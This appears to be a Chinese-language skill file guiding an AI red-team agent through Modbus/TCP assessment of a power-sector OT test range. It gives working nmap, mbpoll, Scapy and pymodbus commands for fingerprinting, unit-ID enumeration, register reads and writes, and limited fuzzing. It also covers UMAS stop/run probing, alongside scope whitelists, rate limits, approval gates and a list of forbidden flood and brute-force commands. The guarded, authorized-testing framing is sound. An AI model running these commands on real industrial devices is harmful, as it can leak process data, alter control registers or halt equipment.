---
name: f2x-power-modbus-attack
description: 电力 OT 靶场 Modbus/TCP 502 端口安全评估技能——协议探测、功能码识别、寄存器与线圈读写、单元 ID 枚举与未授权访问检测，含 pymodbus / mbpoll / modbus-cli / nmap NSE 实操与写操作门禁。
whenToUse: 目标开放 502/tcp，或已确认网内存在 Modbus/TCP 从站（PLC、RTU、通信网关、电表、保护装置），需要判定未授权访问、枚举点位、还原工程语义或验证寄存器可写性时使用。
---

# Modbus/TCP 电力 OT 攻击面技能（f2x-power-modbus-attack）

> **工具可用性与退路（先读这一节）**
> 本技能只依赖本插件自带的 `f2x_orchestrate_*` 工具，**不依赖任何其他插件**。
> 工作流里出现的 `redteam_coverage_mark` / `redteam_finding_register` 是**可选增强**：
> - **成果登记** → `f2x_orchestrate_finding`（本插件自带；`action=update` 到 `verified`
>   强制要求基线/差分/marker 三件套）
> - **覆盖矩阵** → 本插件无此面；用 `f2x_orchestrate_export` 作为覆盖记录，
>   或仅在部署里确实有 `redteam_coverage_mark` 时才回写
> **规则**：目录里没有的工具一律不要调用。开场先跑 `f2x_orchestrate_doctrine` 自检。

> **定位**：本技能只覆盖 **Modbus/TCP（502/tcp）** 单一协议面。上位机（SCADA/HMI）与网络面见 `f2x-power-scada-recon`；S7 见 `f2x-power-s7comm-attack`；IEC 61850 见 `f2x-power-iec61850-analysis`；流量回溯与防守视角见 `f2x-power-traceback`。
>
> **协议事实（来源：`$REDTEAM_REFS/awesome-industrial-protocols/protocols/modbus.md`）**：Modbus/TCP 于 502/tcp，规范见 <https://modbus.org/specs.php>；Wireshark 解析器 `packet-mbtcp.c`；Scapy 层 `scapy/contrib/modbus.py`；Nmap NSE `modbus-discover.nse` 与 `modicon-info.nse`；参考实现 PyModbus、mbtget、ctmodbus、Malmod（Modicon M340 / UMAS）。
>
> **设计前提**：Modbus 规范**本身不含认证与授权**——"能连上就能读、能发写功能码就能写"。因此"未授权访问"在本协议面几乎总是**设计事实**而非配置缺陷；评分价值在于**实际读到的生产过程数据**与**写入对过程的影响**，不在"发现 502 开放"。

---

## 操作步骤

> **⚠️ 关于 `evidence/tools/ot_guard.py`（必读）**
>
> 本技能多处引用 `evidence/tools/ot_guard.py`，它是**你工作区里的一个辅助脚本，本插件不随包提供**。
> 在创建它之前，下面这些 `ot_guard.py` 命令会直接失败。两个选择：
>
> 1. **用本插件真实存在的门禁兜底（推荐）**：所有写操作在上报前先用
>    `f2x_orchestrate_audit` 登记并取得二次确认——本插件的审计门禁会**按动作文本**判定
>    "只读 / 需确认 / 禁止"，写操作没有 `confirmedBy` 一律拒绝，删除与脱库类**硬拒**。
>    这是本插件里**唯一实际生效**的门禁路径。
> 2. **自行实现 `ot_guard.py`**：按本技能「安全约束」一节列出的门禁值（白名单、并发上限、
>    限速、审计可写性）自行编写，并保留它的范围声明与操作配对记录。
>
> 本包**不声称**任何 `ot_guard.py` 层面的保护——没有那个文件时它不存在。


### 0. 授权与前置门禁（未完成不得进入第 1 步）

```bash
# 0.1 确认授权与范围，落到审计日志（第一条记录必须是范围声明）
python3 evidence/tools/ot_guard.py scope --declared "10.10.0.0/24" \
  --authorization "RANGE-2026-POWER-A" --operator "$(whoami)"

# 0.2 生成审计目录与门禁自检（失败即中止全部后续步骤）
mkdir -p evidence/audit evidence/modbus
python3 evidence/tools/ot_guard.py selftest     # 校验白名单/并发/限速/审计可写
```

`ot_guard.py` 的硬编码门禁值（全技能统一，见「安全约束」）：

```python
AUTHORIZED_SCOPE = ("10.10.0.0/24", "192.168.1.0/24")   # 已授权电力靶场段，超出即拒绝
# 授权靶场叠加段（须在授权书范围内显式去掉注释；默认关闭）
# AUTHORIZED_SCOPE += ("192.168.90.0/24", "192.168.95.0/24")
MAX_CONCURRENCY  = 3        # 单目标并发工具调用上限
MIN_INTERVAL_S   = 1.0      # 同一目标两次 Modbus 请求最小间隔
AUDIT            = "evidence/audit/ot-ops.jsonl"
```

### 1. 被动确认（先看流量，不打设备）

目标网段有 SPAN/镜像口或 TAP 时，**优先零发包确认**，避免任何主动探测对 OT 设备的打扰：

```bash
# 1.1 镜像口抓取 10 分钟，只看 Modbus 会话与交互节奏
sudo tcpdump -i eth0 -nn -s0 -w evidence/modbus/passive-$(date +%s).pcap \
  'tcp port 502' -G 600 -W 1

# 1.2 Zeek 离线解析（modbus 分析器内建），产出会话与请求台账
zeek -r evidence/modbus/passive-*.pcap local
cat modbus.log | zeek-cut ts id.orig_h id.orig_p id.resp_h id.resp_p func unit_id

# 1.3 谁在主动轮询谁——这直接给出"工程师站/上位机"嫌疑名单
cat modbus.log | zeek-cut id.orig_h id.resp_h | sort | uniq -c | sort -rn | head
```

判读要点：固定 1 s 周期的单向轮询流 = 上位机/HMI 采集；突发且功能码混杂 = 已有其他扫描器活动（先记录，不要跟着加码）。

### 2. 端口与协议指纹（低频，仅在你确认过的白名单主机上）

```bash
# 2.1 端口态确认：T2 + 限速，绝不用 -T4/-T5
nmap -Pn -sT -p 502 -T2 --max-rate 10 --max-parallelism 1 \
  --host-timeout 120s 10.10.0.5

# 2.2 协议层指纹（modbus-discover 走 0x2B/0x0E 设备识别 + 单元 ID 探测）
nmap -Pn -sT -p 502 -T2 --max-rate 10 \
  --script modbus-discover --script-args modbus-discover.aggressive=false \
  10.10.0.5

# 2.3 只在隔离靶场（过程为仿真、无真实负荷）才允许 aggressive=true
#     该选项会遍历 unit-id 1..255，属于枚举而非爆破；仍须限速并记审计日志
nmap -Pn -sT -p 502 -T2 --max-rate 10 \
  --script modbus-discover --script-args modbus-discover.aggressive=true \
  10.10.0.5 -oN evidence/modbus/10.10.0.5-502-modbus-discover.txt

# 2.4 Modicon 专有信息（modicon-info.nse 来自 DigitalBond Redpoint，需放入 ./nse/）
nmap -Pn -sT -p 502 -T2 --max-rate 10 \
  --script ./nse/modicon-info.nse 10.10.0.5
```

### 3. MBAP 头与功能码识别（手工确认，不依赖脚本结论）

Modbus/TCP ADU = **MBAP（7 字节）+ PDU**：

| 字段 | 长度 | 取值 |
|---|---|---|
| Transaction ID | 2 | 客户端自选，回包原样带回 |
| Protocol ID | 2 | 恒 `0x0000`（非 0 即非 Modbus/TCP） |
| Length | 2 | 后续字节数（Unit ID + PDU） |
| Unit ID | 1 | 从站/单元地址（TCP 网关后常复用，`0xFF` 常见于直连网关） |
| Function Code | 1 | 见下表 |

用 Scapy 手工发一帧，作为**基线/差分/marker 三件套**的构造基础：

```python
# evidence/tools/mb_probe.py —— 单帧、计时、审计内建
from scapy.all import Ether, IP, TCP, Raw, sr1
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU03ReadHoldingRegistersRequest
import time, json, datetime

TARGET, UNIT = "10.10.0.5", 1
audit = lambda rec: open("evidence/audit/ot-ops.jsonl","a").write(json.dumps(rec, ensure_ascii=False)+"\n")
audit({"ts": datetime.datetime.now().astimezone().isoformat(), "op":"modbus.read_holding_registers",
       "target": f"{TARGET}:502", "unit": UNIT, "class":"read", "rate":"1 req/s",
       "authorization":"RANGE-2026-POWER-A"})

pkt = (Ether()/IP(dst=TARGET)/TCP(dport=502, flags="PA")
       /ModbusADURequest(transId=0x1337, unitId=UNIT)
       /ModbusPDU03ReadHoldingRegistersRequest(address=0, count=10))
resp = sr1(pkt, timeout=5, verbose=0)   # 一次一帧
print(resp.show(dump=True) if resp else "no response")
time.sleep(1.0)                          # 强制 ≥1 s 间隔
```

功能码识别清单（用于判定"设备支持面"与"写能力面"）：

| FC | 名称 | 类别 | 危害 |
|---|---|---|---|
| `0x01` | Read Coils | 读 | 🟢 |
| `0x02` | Read Discrete Inputs | 读 | 🟢 |
| `0x03` | Read Holding Registers | 读 | 🟢 |
| `0x04` | Read Input Registers | 读 | 🟢 |
| `0x05` | Write Single Coil | **写** | 🟡/🔴 |
| `0x06` | Write Single Register | **写** | 🟡 |
| `0x07` | Read Exception Status | 读 | 🟢 |
| `0x08` | Diagnostics | **控制** | 🔴 子功能 `0x0004` = Force Listen Only Mode（可致失联） |
| `0x0F` | Write Multiple Coils | **写** | 🟡/🔴 |
| `0x10` | Write Multiple Registers | **写** | 🟡 |
| `0x11` | Report Server ID | 读 | 🟢 |
| `0x17` | Read/Write Multiple Registers | 读+**写** | 🟡 |
| `0x2B`/`0x0E` | Read Device Identification (MEI) | 读 | 🟢 |
| `0x5A` | Modicon UMAS / Unity 专有 | **控制+下载** | 🔴 见第 9 步 |

异常码判读（用于限速熔断，见「安全约束」第 2 条）：`0x01` 非法功能、`0x02` 非法数据地址、`0x03` 非法数据值、`0x04` 从站故障、`0x05` 确认（长任务进行中）、`0x06` 从站忙、`0x08` 存储奇偶错、`0x0A` 网关路径不可用、`0x0B` 网关目标无响应。**收到 `0x06`/`0x04`/`0x05` 立即停止本设备全部探测并退避 60 s**——这是设备已经被打扰的明确信号。

### 4. 单元 ID（Unit/Slave ID）枚举

TCP 直连设备的 Unit ID 常为 `1` 或 `0xFF`，网关后可能挂多个从站：

```bash
# 4.1 mbpoll 单点确认（-t 4 = holding register，-r 引用号，-c 数量，-1 = 0 基址）
mbpoll -m tcp -a 1   -p 502 -t 4 -r 1 -c 4 -1 -v 10.10.0.5
mbpoll -m tcp -a 255 -p 502 -t 4 -r 1 -c 4 -1 -v 10.10.0.5

# 4.2 低频 sweep：脚本内建 1 s 间隔 + 3 并发上限，禁止并行器
python3 evidence/tools/mb_unitid_sweep.py --target 10.10.0.5 --port 502 \
  --units 1-247 --interval 1.0 --max-concurrency 1 \
  --out evidence/modbus/10.10.0.5-unitid-sweep.csv
```

```python
# evidence/tools/mb_unitid_sweep.py 核心（节选）
from pymodbus.client import ModbusTcpClient
import time
for unit in range(1, 248):
    c = ModbusTcpClient("10.10.0.5", port=502, timeout=3)
    c.connect()
    try:
        # pymodbus ≤3.7 用 slave=，≥3.8 改名 device_id=（按装到的版本二选一）
        rr = c.read_holding_registers(address=0, count=1, slave=unit)
    except TypeError:
        rr = c.read_holding_registers(address=0, count=1, device_id=unit)
    print(unit, "NO-RESPONSE" if rr.isError() else rr.registers)
    c.close()
    time.sleep(1.0)        # 硬编码 ≥1 s，禁止改成批量并发
```

### 5. 寄存器与线圈读取（点表还原）

```bash
# 5.1 mbpoll：四种数据模型各取一段
mbpoll -m tcp -a 1 -p 502 -t 0 -r 1 -c 8  -1 -v 10.10.0.5   # 线圈           0x01
mbpoll -m tcp -a 1 -p 502 -t 1 -r 1 -c 8  -1 -v 10.10.0.5   # 离散输入       0x02
mbpoll -m tcp -a 1 -p 502 -t 3 -r 1 -c 10 -1 -v 10.10.0.5   # 输入寄存器     0x04
mbpoll -m tcp -a 1 -p 502 -t 4 -r 1 -c 10 -1 -v 10.10.0.5   # 保持寄存器     0x03

# 5.2 modbus-cli（Ruby gem，PLC 风格符号地址更贴近工程语义）
modbus read  10.10.0.5 40001 10            # 40001..40010 保持寄存器
modbus read  10.10.0.5 %MW0 10             # Modicon %MW 符号
modbus read  10.10.0.5 %M0 8               # 线圈/位
modbus read  10.10.0.5 30001 10            # 输入寄存器
```

```python
# 5.3 pymodbus 交互式客户端（按需逐条，非脚本化扫段）
#     $ pymodbus.console tcp --host 10.10.0.5 --port 502
#     > client.read_holding_registers count=10 address=0 slave=1
#     > client.read_input_registers   count=10 address=0 slave=1
#     > client.read_coils             count=8  address=0 slave=1
#     > client.read_device_information()          # 0x2B/0x0E，方法名随版本变化，先 dir(client) 确认
```

点位语义还原（把裸寄存器变成生产过程事实，这是评分关键）：

1. 与 HMI/SCADA 画面标签对照（见 `f2x-power-scada-recon`，SCADA-LTS 的 `point_values` 与 Modbus 地址一一对应）。
2. 判缩放系数：常见 ×10 / ×100 整数定标（如 `3800` = 380.0 A）或 IEEE754 双寄存器浮点（byte order AB CD / CD AB 都要试）。
3. 找**变化源**：只读一段 5 分钟，看哪些寄存器在动。动的是测量值（MX），不动的是设定值/状态（SP/ST）。
4. 交叉验证：用 mbpoll 读到的值与现场仪表/CSV 基线比对，不一致就是**差分证据**。

### 6. 未授权访问判定（三件套证据，缺一不算）

判据：**未携带任何凭据的裸 Modbus 请求，返回了有效的生产过程数据**。

```bash
# 三件套①：基线——目标正常轮询流（来自第 1 步被动抓包，证明地址确实在跑生产逻辑）
tshark -r evidence/modbus/passive-*.pcap -Y 'mbtcp.func==3' -c 5 \
  -T fields -e ip.src -e ip.dst -e mbtcp.trans_id -e mbtcp.unit_id -e mbtcp.reference_num \
  > evidence/modbus/10.10.0.5-unauth-baseline.txt

# 三件套②：差分——本机（非白名单内其他主机）发出的无凭据读取
sudo tcpdump -i eth0 -nn -s0 -w evidence/modbus/10.10.0.5-unauth-diff.pcap \
  'host 10.10.0.5 and tcp port 502' &
tshark -r evidence/modbus/10.10.0.5-unauth-diff.pcap -Y 'mbtcp.func==3' -T fields \
  -e frame.number -e ip.src -e mbtcp.unit_id -e mbtcp.reference_num -e mbtcp.regval

# 三件套③：marker——本次会话唯一标记（transId 0x1337）在回包中原样出现
tshark -r evidence/modbus/10.10.0.5-unauth-diff.pcap -Y 'mbtcp.trans_id==0x1337'
```

把基线数据与 `evidence/modbus/*-register-map.csv` 关联，产出**"读到的生产过程量"**清单（电压/电流/温度/阀位/断路器位置），这是未授权访问的实际影响面。

### 7. 写操作（**必须走二次确认门禁**）

写功能码：`0x05` 单线圈、`0x06` 单寄存器、`0x0F` 多线圈、`0x10` 多寄存器、`0x17` 读/写混合。

```bash
# 7.1 先申请授权（无 ack 令牌则 ot_guard.py 拒绝执行任何写命令）
python3 evidence/tools/ot_guard.py request-write \
  --target 10.10.0.5 --fc 0x06 --addr 40001 --value 1234 \
  --rationale "验证保持寄存器可写性；该地址被 PLC 逻辑每扫描周期覆盖，属可恢复写入" \
  --rollback "写回原值 0（读取值已记录于 register-map.csv）" \
  --ttl 300
# → 输出 ack-id（形如 cmd-042）。指挥官在会话中显式确认后该 id 才生效。

# 7.2 带 ack 令牌执行（命令本身必须携带 id，审计日志自动落两条：执行前 + 执行后）
python3 evidence/tools/mb_write.py --ack cmd-042 \
  --target 10.10.0.5 --fc 0x06 --addr 0 --value 1234 --interval 1.0

# 7.3 执行后立即回读确认 + 记录 PLC 覆盖行为（这是"可恢复"判定的证据）
sleep 5
mbpoll -m tcp -a 1 -p 502 -t 4 -r 1 -c 1 -1 -v 10.10.0.5
```

写操作红线（任一不满足即放弃该写操作）：

- 地址落在**保护/联锁/跳闸**语义上（断路器位置、跳闸线圈、安全联锁、设定值 SP）→ 一律不做，只以**读取证据**证明可影响性。
- 目标不在已授权白名单段内 → 拒绝。
- 无法说明回滚方式 → 拒绝。
- 过程非仿真（有真实负荷/真实开关）→ 拒绝执行写操作。

### 8. 模糊测试（仅限隔离靶场，且受第 2 条门禁硬约束）

只在**过程为纯仿真**的隔离靶场（如 GRFICSv3 的 simulation 容器，见 `$REDTEAM_REFS/GRFICSv3/docker-compose.yml`）执行，专用于验证实现健壮性：

```bash
# 8.1 受限模糊：单帧速率、总帧数封顶、异常即熔断
python3 evidence/tools/mb_fuzz_limited.py --target 10.10.0.5 --port 502 \
  --interval 1.0 --total 300 --max-concurrency 1 \
  --on-exception-code 0x04,0x05,0x06 --abort-after 2

# 8.2 smod（MODBUS Penetration Testing Framework）——只用其 scanner/read 模块
#     ❌ 绝不执行 smod 的 fuzz / brute 模块（对真实设备等于故障注入）
python3 smod.py
smod > use modbus/scanner
smod > show options
smod > set RHOSTS 10.10.0.5
smod > run
```

### 9. 网关与 Modicon 专有路径（UMAS / `0x5A`）

Modicon M340/M580 在 502/tcp 上除标准 Modbus 外，还暴露 **UMAS** 专有通道（功能码 `0x5A`），历史上允许未认证读取工程信息、切换 RUN/STOP、甚至项目下载（参考 DEF CON 25《Fun with Modbus 0x5a》与 Black Hat 2025《From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs》）。

```bash
# 9.1 只做识别：0x5A 是否响应（单帧，绝不进入子命令）
python3 evidence/tools/mb_probe_umas.py --target 10.10.0.5 --detect-only

# 9.2 深度利用脚本仅在隔离靶场 + 指挥官二次确认后使用（Malmod 参考实现）
#     python3 malmod.py --ip 10.10.0.5 --action <read-project|stop|run>   # 🔴 停机风险
```

UMAS 写/控制动作一律按 🔴 处理：**必须**二次确认 + 先写审计日志 + 记录回滚（`run` 恢复；但**项目下载覆盖不可逆**，不得在授权范围外的任何设备上尝试）。

### 10. 证据固化与痕迹台账

```bash
# 10.1 统一归档
tree -L 3 evidence/modbus
sha256sum evidence/modbus/* > evidence/modbus/SHA256SUMS

# 10.2 审计日志完整性核对（每次写/控制操作前后各一条，必须成对）
python3 evidence/tools/ot_guard.py audit-verify --expect-pairs

# 10.3 登记 finding（未授权访问 / 寄存器可写 / 影响证明）
#     f2x_orchestrate_finding（本插件自带）：evidenceLevel=confirmed（三件套齐）或 impact（读出真实工艺量/写入生效）
```

---

## 安全约束

> 以下六条为**硬编码门禁**，在任何目标、任何阶段、任何理由下不得豁免。门禁由 `evidence/tools/ot_guard.py` 在工具调用前强制执行，仅靠"记着别做"不算通过。

1. **单目标并发不超过 3 个工具调用。**
   对同一目标 IP 同时运行的工具进程（nmap / mbpoll / pymodbus 脚本 / scapy 脚本 / tcpdump 之外的发包器）总数 **≤ 3**。默认实现为 1；确需并发时在上位机侧做排队（`MAX_CONCURRENCY = 3`），禁止 `--min-parallelism`、禁止 `xargs -P`、禁止多终端齐发。超限时 `ot_guard.py` 直接拒绝启动新进程。

2. **模糊测试必须低频化，禁止高频扫描 OT 设备。**
   OT 设备的网络栈与 CPU 余量极小，高频请求直接导致通信超时、看门狗动作甚至停机。硬性限速参数：
   - 端口/主机扫描：`nmap -T2 --max-rate 10 --max-parallelism 1`（禁止 `-T3/-T4/-T5`，禁止 `-sS` 半开以外的激进选项组合）。
   - 同一目标两次 Modbus 请求间隔 **≥ 1 秒**（`time.sleep(1.0)` / `mbpoll -R 1` / `--interval 1.0`）。
   - 模糊测试总请求数封顶 **300 次/设备/小时**，单帧速率 ≤ 1 req/s。
   - 熔断条件：收到异常码 `0x04/0x05/0x06` 连续 2 次、或连接超时连续 2 次 → **立即停止该设备全部探测并退避 60 秒**，写入审计日志后由指挥官决定是否继续。
   - 禁止对任何设备使用 `--script-args modbus-discover.aggressive=true` 以外的遍历选项组合叠加限速解除。

3. **写操作（寄存器写入、线圈强制、固件修改、PLC 启停）必须经过指挥官二次确认，且记入审计日志。**
   写操作 = 功能码 `0x05/0x06/0x0F/0x10/0x17`（写半）、`0x08`（Diagnostics，含 Force Listen Only Mode / Restart Communications）、`0x5A` UMAS 控制与下载。流程强制为：`request-write` 拿 `ack-id` → 指挥官显式确认 → 带 `ack-id` 执行 → 执行前/后各写一条审计日志 → 回读确认。无 `ack-id` 的写命令由门禁拒绝执行，**不接受"口头已经说过了"作为凭据**。

4. **任何可能影响工控设备正常运行的命令，必须先记录到审计日志再执行。**
   判据采用保守口径：**只要不能证明是纯只读，就先记日志**。先记后做，禁止事后补记。审计日志为 JSON Lines，追加写、不覆盖，每条含：`ts`（ISO8601 带时区）、`op`、`target`、`unit`、`fc`/`addr`/`value`、`class`（read/write/control/fuzz）、`rate`、`authorization`、`commander_ack`、`rollback`、`purpose`、`before_state`。

5. **目标范围白名单硬编码，超出白名单一律拒绝执行。**
   ```python
   AUTHORIZED_SCOPE = ("10.10.0.0/24", "192.168.1.0/24")   # 已授权电力靶场段
   # 授权靶场叠加段（须在授权书范围内显式启用；默认关闭）
   # AUTHORIZED_SCOPE += ("192.168.90.0/24", "192.168.95.0/24")
   ```
   所有发包/连接工具在启动前调用 `assert_in_scope(host)`：用 `ipaddress.ip_address(host) in ipaddress.ip_network(cidr)` 判定，**不匹配即 `sys.exit(2)` 并拒绝执行**，同时记录一条拒绝日志。域名必须先解析再判定，禁止用域名绕过；禁止用 `--exclude`/`-iL` 之类把范围外包给配置文件；禁止探测白名单内的**网关外跳地址**（下一跳、对端网段）除非该段本身在白名单内。

6. **禁止 DDoS，禁止爆破；S7 口令只允许离线爆破参考脚本，禁止在线爆破。**
   - 禁止任何形式的 DoS/DDoS 与泛洪：禁止 `hping3 --flood`、禁止 `--script dos`、禁止并发连接耗尽、禁止 Modbus 广播风暴、禁止 `0x08` Force Listen Only Mode 用于致盲。
   - 禁止在线口令爆破：禁止对任何 OT 设备做字典/暴力口令尝试（Modbus 本无口令，S7/UMAS/网关 Web 口令一律禁止在线猜解）。
   - S7 口令仅允许**离线**路线：从已捕获的 pcap 中提取 challenge/response，再离线跑字典（详见 `f2x-power-s7comm-attack` 的 `s7-cracker.py` / `s7-brute-offline.py` 参考实现）。离线爆破不得产生任何网络流量。
   - 唯一例外是"单个已公开默认凭据的一次性验证"（如 SCADA-LTS 默认口令），须记录审计日志；**一旦失败即停止，不得继续尝试第二个口令**。

---

## OT 影响评估

| 等级 | 本技能中的操作 | 影响机制 | 缓解/边界 |
|---|---|---|---|
| 🟢 **只读** | 被动抓包与 Zeek 离线解析（第 1 步）、端口态确认（2.1）、功能码 `0x01/0x02/0x03/0x04/0x07/0x11/0x2B`（第 5 步读部分）、MEI 设备识别 | 不改变任何过程变量；风险仅为网络与 CPU 负载 | 限速 ≥1 s/请求；并发 ≤3；不做全网段遍历 |
| 🟢 **只读** | `modbus-discover` 慢速、`modicon-info` 单次、单元 ID 枚举（枚举非爆破） | 每 unit-id 一次请求；总量 ≤247 次/设备 | 必须 `-T2 --max-rate 10`，分片执行并留有冷却间隔 |
| 🟡 **可恢复写入** | `0x06/0x10` 写保持寄存器且地址属于**被 PLC 逻辑每扫描周期覆盖**的映像区；`0x05/0x0F` 强制输出线圈（非安全相关） | PLC 逻辑在下一个扫描周期用程序值覆盖，物理输出瞬时抖动但被拉回 | 必须二次确认 + 审计日志 + 回读确认；写前记录原值；执行前后各留 5 s 观察窗 |
| 🔴 **不可逆 / 停机风险** | `0x08` Diagnostics（`0x0004` Force Listen Only Mode、`0x0001` Restart Communications）、`0x0F` 强制的**联锁/跳闸/安全相关**线圈、`0x5A` UMAS 切 STOP/项目下载、任何写给**保护定值 SP/跳闸矩阵**的写操作 | 可致设备停止响应、通信接口复位、保护误动或拒动、工程组态被覆盖；UMAS 项目下载**不可逆** | 默认**不执行**；仅隔离仿真靶场 + 指挥官二次确认 + 先审计后执行 + 明确回滚方案 + 现场有人值守 |
| 🔴 **停机风险** | 取消限速的模糊测试、并发 >3、控制类功能码高频重试 | 通信栈拥塞 → 上位机判通信中断 → 触发 fallback/看门狗（可能直接停机或切手动） | 门禁强制禁止；熔断条件命中即退避 60 s |

**一句话结论**：本技能的**读取面**是低风险高价值的（未授权访问证据 + 工艺量泄露），**写入面**的默认立场是不写——只在"能被 PLC 覆盖的映像区 + 仿真过程 + 二次确认"三条件同时满足时才做 🟡 级写入；任何 🔴 级动作在默认配置下由门禁直接拒绝。

---

## 产出与证据

### 必交交付物

| # | 交付物 | 路径 | 计分要点 |
|---|---|---|---|
| 1 | 范围声明与门禁自检记录 | `evidence/audit/ot-ops.jsonl`（首条为 scope 声明） | 证明全程在白名单内、限速合规、写操作有 ack |
| 2 | 协议指纹 | `evidence/modbus/<target>-502-modbus-discover.txt` | 502 开放 + MBAP 可解析 + 设备标识（MEI/Server ID） |
| 3 | 单元 ID 枚举台账 | `evidence/modbus/<target>-unitid-sweep.csv` | 存活 unit-id 列表 + 每项耗时（证明限速） |
| 4 | **寄存器点表（核心）** | `evidence/modbus/<target>-register-map.csv` | 列：`fc,addr,raw,eng_value,unit,scale,meaning,confidence,ts` |
| 5 | 未授权访问三件套 | `evidence/modbus/<target>-unauth-baseline.txt` / `-unauth-diff.pcap` / marker 行 | 基线 + 差分 + marker 回显，三者可独立复现 |
| 6 | 工艺量泄露清单 | `evidence/modbus/<target>-process-values.md` | 读到的电压/电流/温度/阀位/开关位置 → 业务影响 |
| 7 | 写操作审批与执行记录 | `evidence/modbus/write-approval-<opid>.json` + 审计日志成对条目 | ack-id + 原值 + 回读值 + PLC 覆盖行为 |
| 8 | 被动流量证据 | `evidence/modbus/passive-*.pcap` + `modbus.log` | 上位机↔PLC 映射，可推导拓扑 |
| 9 | 覆盖记录 | `f2x_orchestrate_export`（本插件自带；覆盖终态写进交接文档） | 终态 `tested-found`/`tested-clear` + finding 清单 |
| 10 | finding 登记 | `f2x_orchestrate_finding`（本插件自带）：未授权访问 / 寄存器可写 / 工艺量泄露 | `evidenceLevel=confirmed`（三件套齐）或 `impact` |

### 证据质量要求

- **可复现**：每条结论附**完整命令**（含限速参数）与输出摘要；不给"我扫过了"这类不可复现结论。
- **可对照**：读值必须与至少一个独立来源交叉（HMI 画面 / Zeek `modbus.log` / 现场 CSV 基线），单来源不算证据。
- **可判定**：异常码、`NO-RESPONSE`、超时都要原样记录——**"打不通"也是结论**（可能正是限速生效或设备已受扰）。
- **诚实标注**：`confidence` 字段区分 `confirmed`（回包实测）/ `inferred`（从地址规律推断）/ `unknown`；不得把推断写成实测。

### 速用命令卡

```bash
# 指纹（只读，限速）
nmap -Pn -sT -p 502 -T2 --max-rate 10 --script modbus-discover 10.10.0.5
# 读保持寄存器（只读）
mbpoll -m tcp -a 1 -p 502 -t 4 -r 1 -c 10 -1 -v 10.10.0.5
# 读线圈（只读）
mbpoll -m tcp -a 1 -p 502 -t 0 -r 1 -c 8 -1 -v 10.10.0.5
# 被动解析（零发包）
zeek -r passive.pcap local && cat modbus.log | zeek-cut ts id.orig_h id.resp_h func
# ❌ 禁止：nmap -T4 / --min-rate 1000 / hping3 --flood / smod 的 fuzz 与 brute 模块 / 任何在线口令爆破
```
